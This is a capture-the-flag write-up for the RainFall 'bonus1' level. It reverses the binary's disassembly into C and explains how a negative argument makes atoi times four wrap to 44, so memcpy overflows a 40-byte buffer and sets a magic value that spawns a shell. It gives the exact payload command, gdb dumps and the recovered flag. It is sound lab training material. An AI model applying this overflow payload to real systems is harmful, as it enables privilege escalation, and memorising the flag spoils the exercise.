
### notes
```c
0x08048424  main
```

### 0x08048529 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    int argc = ebp+0x8
    char **argv = ebp+12

    number = esp+60
    buffer1[40] = esp+20
    0x40 ... 64
    0x3c ... 60
    0x14 ... 20
}
```
* __`<+0> ➜ <+6> : prepare stack frame for n function with size 64`__
```c
0x08048424 <+0>:	push   ebp
0x08048425 <+1>:	mov    ebp,esp
0x08048427 <+3>:	and    esp,0xfffffff0
0x0804842a <+6>:	sub    esp,64
```
* __`<+9> ➜ <+41> : parse the number from first param and return of number > 9, else : keep going`__
```c
0x0804842d <+9>:	mov    eax,DWORD PTR [argv]
0x08048430 <+12>:	add    eax,4
0x08048433 <+15>:	mov    eax,DWORD PTR [eax] // eax = *argv[1]
0x08048435 <+17>:	mov    DWORD PTR [esp],eax
0x08048438 <+20>:	call   0x8048360 <atoi@plt>
atoi(argv[1])
0x0804843d <+25>:	mov    DWORD PTR [number],eax
0x08048441 <+29>:	cmp    DWORD PTR [number],9
0x08048446 <+34>:	jle    0x804844f <main+43>
0x08048448 <+36>:	mov    eax,1
0x0804844d <+41>:	jmp    0x80484a3 <main+127>
if (number <= 9) {
    jump to <main+43>
} 
else {
    return (1);
}
```
* __`<+43> ➜ <+79> : copy n*4 bytes (n be the number) from second param to our buffer1 with memcpy`__
```c

0x0804844f <+43>:	mov    eax,DWORD PTR [number]
0x08048453 <+47>:	lea    ecx,[eax*4+0]
ecx = number * 4
0x0804845a <+54>:	mov    eax,DWORD PTR [argv]
0x0804845d <+57>:	add    eax,8
0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
eax = *argv[2]
0x08048462 <+62>:	mov    edx,eax
edx = number
0x08048464 <+64>:	lea    eax,[buffer1]
0x08048468 <+68>:	mov    DWORD PTR [esp+8],ecx
0x0804846c <+72>:	mov    DWORD PTR [esp+4],edx
0x08048470 <+76>:	mov    DWORD PTR [esp],eax
0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
memcpy(*buffer1, argv[2], number * 4);
```
* __`<+84> ➜ <+117> : compare content of number to 0x574f4c46, and execute shell if comparison successfull else exit with code 0`__
```c
0x08048478 <+84>:	cmp    DWORD PTR [number],0x574f4c46
0x08048480 <+92>:	jne    0x804849e <main+122>
0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0
0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580 // "sh"
0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583 // "/bin/sh"
0x08048499 <+117>:	call   0x8048350 <execl@plt>
if (number == 0x574f4c46) {
    execl("/bin/sh", "sh", 0);
}
else {
    return (0);
}

```
* __`<+122> ➜ <+128> : eax = 0 and leave program `__
```c
0x0804849e <+122>:	mov    eax,0x0
0x080484a3 <+127>:	leave  
0x080484a4 <+128>:	ret   
```
----
### Code Prediction 
```c
int main(int argc(ebp+0x8), char **argv(ebp+12)) {
    int number;
    char *buffer1[40];

    number = atoi(argv[1]);

    if (number <= 9) {
        memcpy(*buffer1, argv[2], number * 4);

        if (number == 0x574f4c46) {
            execl("/bin/sh", "sh", 0);
        }

        return (0);
    } 
    return (1);
}

```
----
### Stack Illustration
```c
+-------------------+ 
+      **argv       +
+-------------------+ +12
+        argc       +
+-------------------+ +8
+ret addr (OLD_EIP) +
+-------------------+ +4
+      OLD_EBP      +
+-------------------+ <---EBP   <----------------+
+and esp,0xfffffff0 + <--- stack alignement      |
+-------------------+ +60                        |
         *                                       |
         *                                       |
         *                                       |
+-------------------+ +44                        |
+      number       +                            |
+-------------------+ +40  <--+                  |
+      buffer1      +         + 40 bytes         |
+-------------------+ +20  <--+                  | main frame (60 bytes)
         *                                       |
         *                                       |
         *                                       |
+-------------------+ +12                        |
+                   +                            |
+-------------------+ +8                         |
+                   +                            |
+-------------------+ +4                         |
+                   +                            |
+-------------------+ <---ESP   <----------------+
```
---
### Process of the Exploit

- If atoi(argv[0]) > 9 the program doesn't run
    >0x08048441 <+29>:	cmp    DWORD PTR [number],9

- else it will call a memcpy that we can try to overflow
    >0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
- to change the number value we have to fill the buffer first with 40 bytes then add more 4 bytes to overwrite number that is in top of it in the stack (check [Stack Illustration](#stack-illustration))

    >TOP_STACK -----> BUFFER -----> NUMBER -------> LOWER_STACK

```txt
Value of INT_MAX is +2147483647.
Value of INT_MIN is -2147483648.
-2147483648 * 4 = 0
(-2147483648 + 11) * 4 = 44
-2147483637  * 4 = 44
```
use this little c program to test 
```c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main()
{   
    int nb = atoi("-2147483637");
    printf("nb      = [%d]\n", nb);
    printf("nb * 4  = [%d]", nb * 4);
    return 0;
}
// nb      = [-2147483637]
// nb * 4  = [44]
```
- now we got the negative number that will give us 44 as a result when multiply by 4
- lets prepare our payload :
PAYLOAD = arg1(-2147483637) + arg2(A * 40 + 0x574f4c46)
> ./bonus1 -2147483637 $(python -c 'print("A"*40 + "\x57\x4f\x4c\x46"[::-1])')
```shell
   (gdb) disass
    Dump of assembler code for function main:
    ...
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
=> 0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
(gdb) x $esp+0x3c
0xbffff6ec:	70
(gdb) x * 0xbffff6ec
0x574f4c46:	Cannot access memory at address 0x574f4c46
(gdb) x/20wx $esp 
0xbffff6b0:	0xbffff6c4	0xbffff8da	0x0000002c	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x574f4c46
0xbffff6f0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
(gdb) 


```
---
### Solution :
```shell
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print("A"*40 + "\x57\x4f\x4c\x46"[::-1])')
$ pwd
/home/user/bonus1
$ whoami
bonus2
$ cd /home/user/bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ 
```

**`flag: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`**